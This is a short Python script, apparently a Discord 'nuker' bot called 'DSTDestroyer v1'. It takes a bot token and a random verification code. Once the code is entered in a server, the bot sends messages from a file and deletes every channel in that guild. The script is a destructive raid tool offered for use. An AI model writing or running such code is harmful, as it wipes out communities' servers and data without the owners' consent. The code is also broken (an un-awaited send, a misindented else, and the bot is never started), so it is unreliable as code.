import discord
from discord.ext import commands
import pyfiglet
import hashlib
import random


print(pyfiglet.figlet_format('DSTDestroyer v1'))

token = input('Token: ')
bot = commands.Bot('-')

auth = hashlib.md5(str(random.randint(10000,99999999)).encode()).hexdigest()
print(f'''Please enter the command: 

verify {auth}

Into the server so we can get the ID.
''')

@bot.command()
async def verify(ctx, token1):
  global auth
  if token1 == auth:
    input('Press enter to start.')
    for line in open('message.txt'):
      ctx.send(line)
    for c in ctx.guild.channels:
      await c.delete()
   else:
    print('Wrong Token...')

